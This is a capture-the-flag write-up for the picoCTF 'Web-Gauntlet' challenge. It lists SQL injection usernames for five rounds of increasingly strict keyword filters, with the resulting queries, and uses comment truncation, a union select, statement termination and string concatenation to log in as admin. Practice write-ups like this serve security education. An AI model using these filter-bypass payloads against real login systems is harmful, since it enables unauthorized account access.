# Web-Gauntlet
AUTHOR: MADSTACKS
DESCRIPTION: Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:29164/ http://jupiter.challenges.picoctf.org:29164/filter.php

# Solution
The challenges consist of 5 Rounds, each requiring SQL injections to move to the next round.

Round 1: <br>
Filter :  `or` <br>
Username = `admin' -- `<br>
Password = `foo` <br>
Query : `SELECT * FROM users WHERE username='admin' --' AND password='foo'`<br>
<br>
Round 2: <br>
Filter : `or and = like --` <br>
Username = `admin' union select * from users where '1`<br>
Password = `foo`<br>
Query : `SELECT * FROM users WHERE username='admin' union select * from users where '1' AND password='foo'`<br>
<br>
Round 3: <br>
Filter : `or and = like > < --`<br>
Username = `admin';`<br>
Password = `foo`<br>
Query : `SELECT * FROM users WHERE username='admin';' AND password='foo'`<br>
<br>
Round 4: <br>
Filter : `or and = like > < -- admin`<br>
Username = `ad'||'min;`<br>
Password = `foo`<br>
Query : ` SELECT * FROM users WHERE username='ad'||'min';' AND password='foo'`<br>
<br>
Round 5: <br>
Filter : `or and = like > < -- union admin`<br>
Username = `ad'||'min;`<br>
Password = `foo`<br>
Query : `SELECT * FROM users WHERE username='ad'||'min';' AND password='foo'`<br>

FLAG will be present in `filter.php` at the end of 5 rounds
